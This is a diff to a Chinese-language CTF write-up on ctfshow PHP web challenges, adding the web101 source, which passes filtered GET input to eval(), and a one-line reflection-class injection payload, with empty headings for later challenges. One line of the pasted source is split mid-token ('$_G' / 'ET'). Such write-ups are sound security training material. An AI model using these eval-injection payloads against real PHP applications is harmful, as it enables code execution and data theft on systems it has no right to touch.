@@ -7661,6 +7661,14 @@ if(isset($_GET['num'])){
 >
 > ?num[]=9
 
+
+
+
+
+
+
+
+
 ### ctf\_show web90
 
 ~~~php
@@ -8020,7 +8028,7 @@ if(isset($_GET['n']) && in_array($_GET['n'], $allow)){ //*** in_array()函数有
 
 ![image-20220816150238336](CTF刷题WriteUp.assets/image-20220816150238336.png)
 
-### ctf\_show web100 。。。。。
+### ctf\_show web100 
 
 ~~~php
 <?php
@@ -8060,6 +8068,76 @@ if($v0){  //确保为真
 > ?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
 
 ![image-20220816152559524](CTF刷题WriteUp.assets/image-20220816152559524.png)
+
+
+
+### ctf\_show web101
+
+~~~php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-22 00:26:48
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_G
+    ET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
+        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
+
+?> 
+~~~
+
+
+
+> ?v1=2&v2=echo new Reflectionclass&v3=;
+
+反射类技术
+
+### ctf\_show web102
+
+
+
+ctf\_show web103
+
+
+
+ctf\_show web104
+
+
+
+ctf\_show web105
+
+
+
+ctf\_show web106
+
+
+
+
+
+ctf\_show web107
+
+ctf\_show web108
 
 
 
